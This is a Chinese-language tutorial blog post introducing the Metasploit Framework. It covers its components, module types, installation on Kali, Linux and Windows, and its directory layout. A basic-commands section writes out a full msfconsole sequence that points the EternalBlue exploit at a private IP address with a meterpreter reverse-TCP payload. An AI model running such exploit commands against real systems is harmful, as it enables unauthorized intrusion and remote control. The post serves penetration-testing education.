---
title: MSF框架介绍与环境搭建
date: 2026-07-23 10:00:00 +0800
categories: [工具速查, MSF利用]
tags: [Metasploit, 渗透测试, 环境搭建]
description: Metasploit Framework 架构解析与安装配置指南，涵盖 Kali/Windows 部署、数据库连接、模块体系及核心命令。
---

# MSF框架介绍与环境搭建

## 一、MSF 概述

Metasploit Framework（简称 MSF）是由 HD Moore 于 2003 年开发的安全漏洞利用框架，目前是渗透测试领域使用最广泛的开源工具。它提供了完整的漏洞利用开发环境、Payload 生成模块、后渗透模块以及大量已验证的攻击载荷。

### 核心组件

| 组件 | 功能 |
|------|------|
| msfconsole | 主控台，交互式命令行界面 |
| msfdb | 数据库管理模块，支持 PostgreSQL |
|msfvenom | Payload 生成与编码工具 |
| msfupdate | 模块更新工具 |

### 模块分类

1. **Exploit（渗透攻击模块）**：包含已知漏洞的利用代码
2. **Payload（攻击载荷）**：在目标系统上执行的代码
3. **Auxiliary（辅助模块）**：信息收集、扫描、嗅探等功能
4. **Encoder（编码器）**：Payload 免杀编码
5. **Post（后渗透模块）**：提权、横向移动、信息收集
6. **Nops（空指令模块）**：维持缓冲区大小

## 二、环境搭建

### Kali Linux（推荐）

MSF 已预装在 Kali 中：

```bash
# 启动数据库
sudo systemctl start postgresql
sudo msfdb init

# 启动 MSF 控制台
msfconsole

# 验证数据库连接
msf6 > db_status
```

### Linux 手动安装

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### Windows 安装

通过官方 MSI 安装包或 WSL2 部署。

## 三、基础命令

```bash
# 启动
msfconsole

# 搜索模块
msf6 > search ms17-010

# 使用模块
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 查看选项
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# 设置参数
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 执行攻击
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

## 四、目录结构

```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/      # 渗透模块
│   ├── payloads/      # 攻击载荷
│   ├── auxiliary/     # 辅助模块
│   ├── post/          # 后渗透模块
│   ├── encoders/      # 编码器
│   └── nops/          # 空指令模块
├── plugins/           # 插件
└── scripts/           # 脚本
```

---

> 下一篇文章将介绍如何利用 auxiliary 模块进行信息收集和漏洞扫描。
